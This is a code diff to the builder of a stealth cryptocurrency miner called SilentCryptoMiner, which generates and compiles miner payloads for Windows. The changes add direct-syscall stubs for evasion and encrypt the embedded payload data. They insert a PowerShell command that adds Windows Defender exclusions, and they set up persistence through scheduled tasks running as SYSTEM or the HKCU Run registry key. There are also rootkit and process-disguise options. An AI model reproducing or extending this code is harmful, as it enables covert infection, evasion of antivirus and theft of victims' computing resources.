@@ -77,8 +77,7 @@ namespace SilentCryptoMiner
                 var maincode = new StringBuilder(mainFileCode);
                 ReplaceGlobals(ref maincode);
 
-                RunExternalProgram(paths["syswhispers2"], "-a x64 -l gas --function-prefix \"Ut\" -f NtSetInformationFile,NtCreateFile,NtWriteFile,NtReadFile,NtCreateSection,NtClose,NtMapViewOfSection,NtCreateTransaction,NtOpenFile,NtRollbackTransaction,NtResumeThread,NtGetContextThread,NtSetContextThread,NtWriteVirtualMemory,NtProtectVirtualMemory,NtSetInformationProcess,NtDelayExecution -o UFiles\\Syscalls\\syscalls", currentDirectory, paths["syswhispers2log"]);
-
+                RunExternalProgram(paths["syswhispers2"], "-a x64 -l gas --function-prefix \"Ut\" -f NtSetInformationFile,NtSetInformationProcess,NtCreateFile,NtWriteFile,NtReadFile,NtDeleteFile,NtCreateSection,NtClose,NtMapViewOfSection,NtOpenFile,NtResumeThread,NtGetContextThread,NtSetContextThread,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtFreeVirtualMemory,NtDelayExecution,NtOpenProcess,NtCreateUserProcess,NtOpenProcessToken,NtWaitForSingleObject,NtQueryAttributesFile,NtQueryInformationFile,NtCreateMutant,NtAdjustPrivilegesToken,NtQuerySystemInformation -o UFiles\\Syscalls\\syscalls", currentDirectory, paths["syswhispers2log"]);
                 File.WriteAllText(paths["filename"] + ".cpp", maincode.ToString());
                 RunExternalProgram(paths["g++"], compilerCommand, currentDirectory, paths["g++log"]);
                 File.Delete(paths["resource.o"]);
@@ -93,7 +92,7 @@ namespace SilentCryptoMiner
             }
             catch (Exception ex)
             {
-                MessageBox.Show("Error: An error occured while compiling the file: " + ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                F.BuildError(true, "Error: An error occured while compiling the file: " + ex.Message);
                 return false;
             }
             return true;
@@ -245,8 +244,8 @@ namespace SilentCryptoMiner
         {
             StringBuilder file = new StringBuilder();
             file.AppendLine($"long {name}Size = {data.Length};");
-            file.AppendLine($"unsigned char {name}[{data.Length}] = {{ {(data.Length > 0 ? "0x" + BitConverter.ToString(data).Replace("-", ",0x") : "")} }};");
-            File.WriteAllText(Path.Combine(Path.GetDirectoryName(F.savePath), $"UFiles\\{name}.h"), file.ToString());
+            file.AppendLine($"unsigned char {name}[{data.Length}] = {{ {(data.Length > 0 ? "0x" + BitConverter.ToString(Cipher(data, F.CipherKey)).Replace("-", ",0x") : "")} }};");
+            File.WriteAllText(Path.Combine(Path.GetDirectoryName(F.savePath), $"UFiles\\{name}.h"), file.ToString(), Encoding.ASCII);
             output.AppendLine($"#include \"UFiles\\{name}.h\"");
         }
 
@@ -273,25 +272,20 @@ namespace SilentCryptoMiner
         {
             bool systemadmincheck = F.toggleRunSystem.Checked && F.toggleAdministrator.Checked;
 
-            if (F.mineETH || F.xmrGPU)
+            if (F.xmrGPU)
             {
-                stringb.Replace("DefGPU", "true");
-
-                if (F.xmrGPU)
-                {
-                    stringb.Replace("DefXMRGPU", "true");
-                }
+                stringb.Replace("DefGPULibs", "true");
             }
 
             if (F.mineXMR)
             {
-                stringb.Replace("DefXMR", "true");
+                stringb.Replace("DefMineXMR", "true");
             }
 
             if (F.toggleWDExclusions.Checked)
             {
                 stringb.Replace("DefWDExclusions", "true");
-                stringb.Replace("#WDCOMMAND", $"powershell Add-MpPreference -ExclusionPath @($env:UserProfile, $env:ProgramFiles) -Force");
+                stringb.Replace("#WDCOMMAND", $"Add-MpPreference -ExclusionPath @($env:UserProfile, $env:ProgramFiles) -Force");
             }
 
             if (F.FormAO.toggleRootkit.Checked)
@@ -317,9 +311,12 @@ namespace SilentCryptoMiner
             if (F.chkBlockWebsites.Checked && !string.IsNullOrEmpty(F.txtBlockWebsites.Text))
             {
                 stringb.Replace("DefBlockWebsites", "true");
-                stringb.Replace("$DOMAINSETSIZE", F.txtBlockWebsites.Text.Split(',').Length.ToString());
-                stringb.Replace("$CSDOMAINSET", $"\" {string.Join("\", \" ", F.txtBlockWebsites.Text.Split(','))}\"");
-                stringb.Replace("$CPPDOMAINSET", $"AY_OBFUSCATE(\" {string.Join("\"), AY_OBFUSCATE(\" ", F.txtBlockWebsites.Text.Split(','))}\")");
+
+                string[] domainList = F.txtBlockWebsites.Text.Split(',');
+                stringb.Replace("$DOMAINSETSIZE", domainList.Length.ToString());
+                stringb.Replace("$CSDOMAINSET", $"\" {string.Join("\", \" ", domainList)}\"");
+                stringb.Replace("$CPPDOMAINSET", $"AY_OBFUSCATE(\" {string.Join("\"), AY_OBFUSCATE(\" ", domainList)}\")");
+                stringb.Replace("$DOMAINSIZE", (F.txtBlockWebsites.Text.Replace("'", "").Length + domainList.Length*15).ToString());
             }
 
             if (int.Parse(F.txtStartDelay.Text) > 0)
@@ -342,21 +339,21 @@ namespace SilentCryptoMiner
                     case "AppData":
                         {
                             installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)";
-                            basedir = "CSIDL_APPDATA";
+                            basedir = "AppData";
                             break;
                         }
 
                     case "UserProfile":
                         {
                             installdir = "Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)";
-                            basedir = "CSIDL_PROFILE";
+                            basedir = "UserProfile";
                             break;
                         }
 
                     default:
                         {
                             installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)";
-                            basedir = "CSIDL_APPDATA";
+                            basedir = "AppData";
                             break;
                         }
                 }
@@ -364,7 +361,7 @@ namespace SilentCryptoMiner
                 if (systemadmincheck)
                 {
                     installdir = "Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles)";
-                    basedir = "CSIDL_PROGRAM_FILES";
+                    basedir = "ProgramFiles";
                 }
 
                 stringb.Replace("$BASEDIR", basedir);
@@ -389,19 +386,21 @@ namespace SilentCryptoMiner
             }
 
             stringb.Replace("$CSLIBSROOT", F.chkStartup.Checked && systemadmincheck ? "Environment.SpecialFolder.ProgramFiles" : "Environment.SpecialFolder.ApplicationData");
-            stringb.Replace("$CPPLIBSROOT", F.chkStartup.Checked && systemadmincheck ? "CSIDL_PROGRAM_FILES" : "CSIDL_APPDATA");
+            stringb.Replace("$CPPLIBSROOT", F.chkStartup.Checked && systemadmincheck ? "ProgramFiles" : "AppData");
 
             stringb.Replace("$FINDSET", $"\"{string.Join("\", \"", F.findSet)}\"");
 
             stringb.Replace("#WATCHDOGID", F.watchdogID);
 
-            stringb.Replace("#STARTUPADD", ReplaceEscape($"powershell <#{F.Randomi(F.rand.Next(5, 10), false)}#> IF((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {{ IF([System.Environment]::OSVersion.Version -lt [System.Version]\"6.2\") {{ \"schtasks /create /f /sc onlogon /rl highest {(systemadmincheck ? "/ru 'System'" : "")} /tn '{F.txtStartupEntryName.Text.Replace("'", "''")}' /tr '''<S>'''\" }} Else {{ Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute '<S>')  -Trigger (New-ScheduledTaskTrigger {(systemadmincheck ? "-AtStartup" : "-AtLogOn")})  -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DisallowHardTerminate -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -ExecutionTimeLimit (New-TimeSpan -Days 1000))  -TaskName '{F.txtStartupEntryName.Text.Replace("'", "''")}' {(systemadmincheck ? "-User 'System'" : "")} -RunLevel 'Highest' -Force; }} }} Else {{ reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtStartupEntryName.Text}\" /t REG_SZ /f /d '<S>' }}"));
-            stringb.Replace("#STARTUPSTART", ReplaceEscape($"powershell <#{F.Randomi(F.rand.Next(5, 10), false)}#> IF((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {{ schtasks /run /tn \"{F.txtStartupEntryName.Text}\" }} Else {{ \"<S>\" }}"));
+            stringb.Replace("#STARTUPADD", ReplaceEscape($"<#{F.Randomi(F.rand.Next(5, 10), false)}#> IF((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {{ IF([System.Environment]::OSVersion.Version -lt [System.Version]\"6.2\") {{ schtasks /create /f /sc onlogon /rl highest {(systemadmincheck ? "/ru 'System'" : "")} /tn '{F.txtStartupEntryName.Text.Replace("'", "''")}' /tr '''<S>''' }} Else {{ Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute '<S>')  -Trigger (New-ScheduledTaskTrigger {(systemadmincheck ? "-AtStartup" : "-AtLogOn")})  -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DisallowHardTerminate -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -ExecutionTimeLimit (New-TimeSpan -Days 1000))  -TaskName '{F.txtStartupEntryName.Text.Replace("'", "''")}' {(systemadmincheck ? "-User 'System'" : "")} -RunLevel 'Highest' -Force; }} }} Else {{ reg add \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\" /v \"{F.txtStartupEntryName.Text}\" /t REG_SZ /f /d '<S>' }}"));
+            stringb.Replace("#STARTUPSTART", ReplaceEscape($"<#{F.Randomi(F.rand.Next(5, 10), false)}#> IF((New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {{ schtasks /run /tn \"{F.txtStartupEntryName.Text}\" }} Else {{ \"<S>\" }}"));
 
-            stringb.Replace("#TASKSCHREM", @$"/c schtasks /delete /f /tn \""{F.txtStartupEntryName.Text}\""");
-            stringb.Replace("#REGREM", @$"/c reg delete \""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""{F.txtStartupEntryName.Text}\"" /f");
+            stringb.Replace("#TASKSCHREM", $@"/c schtasks /delete /f /tn \""{F.txtStartupEntryName.Text}\""");
+            stringb.Replace("#REGREM", $@"/c reg delete \""HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"" /v \""{F.txtStartupEntryName.Text}\"" /f");
             
             stringb.Replace("#CONHOSTPATH", F.FormAO.toggleRootkit.Checked ? @"\\dialer.exe" : @"\\conhost.exe");
+
+            stringb.Replace("#TMPNAME", $@"\\{F.Randomi(8, false)}.tmp");
 
             stringb.Replace("#CIPHERKEY", F.CipherKey);
             stringb.Replace("#UNAMKEY", F.UNAMKEY);
